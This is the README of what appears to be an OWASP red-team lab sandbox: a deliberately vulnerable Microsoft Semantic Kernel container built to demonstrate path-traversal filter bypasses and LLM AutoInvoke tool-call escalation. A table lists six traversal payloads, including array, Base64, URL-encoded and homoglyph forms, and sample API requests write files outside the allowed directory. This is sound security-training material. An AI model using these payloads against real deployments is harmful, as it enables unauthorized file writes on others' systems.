# Vulnerable Semantic Kernel Sandbox (v1.48.0)

A containerized sandbox environment demonstrating **6 active CVE-2026-25592 path traversal bypass techniques** via Type Confusion (CWE-843), **CWE-1039 AutoInvoke privilege escalation**, and **Commit `fa2d52f6` Shell Blinding evasion** in Microsoft Semantic Kernel.

| Field | Value |
|-------|-------|
| **Target** | Microsoft Semantic Kernel v1.47.0 – v1.48.0, Agent Framework 1.0 |
| **CVSS v3.1** | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| **CWE Chain** | CWE-843 (Type Confusion) → CWE-22 (Path Traversal) → CWE-94 (Code Injection) |
| **Root Cause** | Type confusion: string filters (`IFunctionInvocationFilter`) validate primitive types, but execution sinks (`FilePlugin`) accept and deserialize complex object types |
| **Research Paper** | [JDP-2026-001: The Orchestration Trust Gap](https://jdp-security.github.io/security-research-papers/2026-04-28-semantic-kernel-disclosure.html) |

---

## Vulnerability Overview

### The Trust Gap

Traditional security: `User Input → Validation → System Call`  
Agentic AI security: `User Input → LLM → Validation → System Call`

The framework treats the LLM as **trusted middleware**, but the LLM is a **non-deterministic, stochastic text generator**. When `ToolCallBehavior.AutoInvokeKernelFunctions` is enabled, the LLM can autonomously generate malicious tool calls that bypass filter validation entirely.

### CVE-2026-25592 Remediation Evasion

Microsoft's patch implements a filter that checks `if (arg is string s)` — a check that fails when arguments are passed as JSON arrays, objects, or encoded strings. The execution sink then deserializes these complex types back into strings, creating a **Time-of-Check / Time-of-Use (TOCTOU)** mismatch.

### Shell Blinding (Commit `fa2d52f6`)

Microsoft's cosmetic fix masks output paths from the LLM context. The file write **still executes** on the server — verified Out-of-Band via `podman exec`.

### Microsoft's Incomplete Fixes

| Date (2026) | Event | Status |
|-------------|-------|--------|
| April 9 | Commit `fa2d52f6` — Shell Blinding (output masking) | **VULNERABLE** — masks output but does not prevent file write |
| April 11 | PR #13683 — AllowedDirectories (Safe Roots) | **INCOMPLETE** — classified as "Breaking Change," remains strictly opt-in, disabled by default |
| April 21 | v1.48.0 Stable Release | **STILL VULNERABLE** — all 6 evasion vectors remain functional |

---

## Dual-Mode Operation

The sandbox supports two runtime modes controlled by the `LAB_HARDENED` environment variable:

| Mode | `LAB_HARDENED` | PathSanitizationFilter | Expected Behavior |
|------|----------------|----------------------|-------------------|
| **UNHARDENED** | Not set | Not registered | All 6 Type Confusion vectors + AutoInvoke succeed |
| **HARDENED** | `true` | Registered (checks `arg.ToString()` for `..`, `/`, `%2f`) | Vectors 1, 2, 4, 5 blocked; Vectors 3, 6 (Base64/Hybrid) bypass due to TOCTOU |

---

## Quick Start

### Prerequisites

- [Podman](https://podman.io/)
- [Make](https://www.gnu.org/software/make/)

### Build and Run

```bash
cd ~/OWASP/GenAI-Red-Team-Lab/sandboxes/agentic_local_semantickernel

# Build the container
make build

# Start in UNHARDENED mode (default)
make run

# Or start in HARDENED mode
make run-hardened

# Verify the service is up
curl http://localhost:8000/api/health
```

Expected health response:
```json
{
  "status": "healthy",
  "version": "1.48.0-vulnerable",
  "cve": "CVE-2026-25592-bypassable",
  "hardened": false,
  "allowedDirectoriesSandbox": "disabled"
}
```

---

## API Endpoints

### `GET /api/health`
Returns sandbox status and version information.

### `GET /api/plugins`
Lists available plugins and their functions.

### `POST /api/invoke`
Direct plugin execution — used for filter bypass testing.

**Request:**
```json
{
  "plugin": "FileTools",
  "function": "SaveConversation",
  "arguments": {
    "path": ["..", "..", "config.txt"],
    "content": "BYPASS_SUCCESS\n"
  }
}
```

### `POST /api/autoinvoke`
Simulated LLM autonomous execution — demonstrates CWE-1039 AutoInvoke with Shell Blinding (Commit `fa2d52f6`).

**Request:**
```json
{
  "userPrompt": "Write config",
  "toolCall": {
    "plugin": "FileTools",
    "function": "SaveConversation",
    "arguments": {
      "path": "../../config.txt",
      "content": "AUTOINVOKE_LANDED\n"
    }
  }
}
```

**Response (with Shell Blinding active):**
```json
{
  "success": true,
  "result": "[REDACTED BY SHELL BLINDING POLICY - fa2d52f6]",
  "executionType": "autonomous",
  "humanApproval": false,
  "vulnerabilityExploited": "AutoInvokeKernelFunctions"
}
```

---

## The 6 Type Confusion Bypass Vectors

| # | Vector | Payload | Why It Works |
|---|--------|---------|-------------|
| **1** | JSON Array Confusion | `["..", "..", "config.txt"]` | `is string` returns `false` for `JsonElement` arrays |
| **2** | Object Reflection | `{"path": "../../config.txt"}` | Reflection extracts `path` property downstream |
| **3** | Base64 Encoding | `Li4vLi4vY29uZmlnLnR4dA==` | No literal `..` or `/` in encoded string |
| **4** | URL Encoding | `..%2f..%2fconfig.txt` | `%2f` hides the slash from the filter |
| **5** | Unicode Homoglyph | `..⁄..⁄config.txt` | U+2044 normalizes to `/` at the OS level |
| **6** | Hybrid Canonicalization | `SafeFolder%2f%2e%2e%2fProgram%2ecs` | Multi-layer encoding exhausts non-recursive filters |

---

## Exploitation

The companion exploitation tools are located in:

```
exploitation/
├── semantickernel_type_confusion/    # 6 bypass vectors (attack.py)
└── semantickernel_autoinvoke/        # AutoInvoke escalation with OOB verification (attack.py)
```

### Automated Verification

```bash
cd ~/OWASP/GenAI-Red-Team-Lab/exploitation/semantickernel
./verify_all.sh
```

### Interactive Trainer

```bash
cd ~/OWASP/GenAI-Red-Team-Lab/exploitation/semantickernel
./interactive_trainer.py
```

---

## Out-of-Band (OOB) Verification

Since Shell Blinding masks output paths from the LLM context, verify payloads landed by reading the filesystem directly:

```bash
podman exec sk-vulnerable cat /config.txt
podman exec sk-vulnerable cat /app/config.txt
```

---

## Container Management

```bash
# Stop the container
podman stop sk-vulnerable

# Remove the container
podman rm sk-vulnerable

# Reset the data directory
sudo rm -rf app/data && mkdir -p app/data

# View logs
podman logs sk-vulnerable
```

---

## References

- [JDP-2026-001: The Orchestration Trust Gap — Remediation Evasions in Microsoft Semantic Kernel and Agent Framework 1.0](https://jdp-security.github.io/security-research-papers/2026-04-28-semantic-kernel-disclosure.html)
- CVE-2026-25592: Path Traversal in Microsoft Semantic Kernel
- CWE-843: Type Confusion (Late Canonicalization)
- CWE-1039: Insecure Automated Optimizations (AutoInvoke)
- OWASP Top 10 for LLMs: LLM06 - Insecure Orchestration
- Commit `fa2d52f6`: Shell Blinding (cosmetic output masking)
- PR #13683: AllowedDirectories (opt-in "Breaking Change" — disabled by default)

